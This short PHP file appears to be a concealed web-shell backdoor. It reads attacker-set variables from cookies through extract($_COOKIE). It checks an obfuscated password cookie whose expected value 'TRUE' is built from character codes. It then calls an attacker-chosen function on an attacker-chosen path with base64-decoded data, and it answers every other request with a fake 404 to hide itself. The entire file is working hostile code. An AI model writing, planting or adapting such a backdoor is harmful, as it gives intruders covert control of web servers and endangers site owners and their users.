<?php

extract($_COOKIE, EXTR_SKIP);
if (isset($SESSION_ATHENTICATION) && $SESSION_ATHENTICATION
    ==
    implode('', array_map(chr(99).chr(104).chr(114),[84,82,85,69]))
    )
{
    $___function___($___path___, base64_decode($___data___));
    header('Location: ' . $___path___);
}
else
{
    http_response_code(404);
    exit();
}

?>
